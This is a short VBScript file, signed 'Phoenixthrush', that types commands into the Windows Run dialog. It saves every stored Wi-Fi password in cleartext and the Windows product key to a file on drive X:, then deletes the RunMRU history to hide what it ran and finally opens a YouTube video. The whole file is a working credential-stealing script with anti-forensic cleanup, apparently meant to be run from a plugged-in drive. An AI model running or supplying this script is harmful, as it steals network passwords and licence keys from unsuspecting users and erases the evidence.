Set WshShell = WScript.CreateObject("WScript.Shell")

CreateObject("shell.application").FileRun()
WScript.Sleep 250
WshShell.SendKeys "{BACKSPACE}"
WScript.Sleep 35
WshShell.SendKeys "cmd /c echo ({%})date({%}) ({%})time({%}) >> X:\phoenix.txt"
WScript.Sleep 35
WshShell.SendKeys "{ENTER}"

WScript.Sleep 35

CreateObject("shell.application").FileRun()
WScript.Sleep 250
WshShell.SendKeys "{BACKSPACE}"
WScript.Sleep 35
WshShell.SendKeys "cmd /c netsh wlan show profile * key=clear >> X:\phoenix.txt"
WScript.Sleep 35
WshShell.SendKeys "{ENTER}"

WScript.Sleep 35

CreateObject("shell.application").FileRun()
WScript.Sleep 250
WshShell.SendKeys "{BACKSPACE}"
WScript.Sleep 35
WshShell.SendKeys "cmd /c wmic path softwarelicensingservice get OA3xOriginalProductKey >> X:\phoenix.txt"
WScript.Sleep 35
WshShell.SendKeys "{ENTER}"

WScript.Sleep 35

CreateObject("shell.application").FileRun()
WScript.Sleep 250
WshShell.SendKeys "{BACKSPACE}"
WScript.Sleep 35
WshShell.SendKeys "cmd /c reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f"
WScript.Sleep 35
WshShell.SendKeys "{ENTER}"

WScript.Sleep 35

CreateObject("shell.application").FileRun()
WScript.Sleep 250
WshShell.SendKeys "{BACKSPACE}"
WScript.Sleep 35
WshShell.SendKeys "https://www.youtube.com/watch?v=PDJLvF1dUek"
WScript.Sleep 35
WshShell.SendKeys "{ENTER}"

' Copyright Phoenixthrush
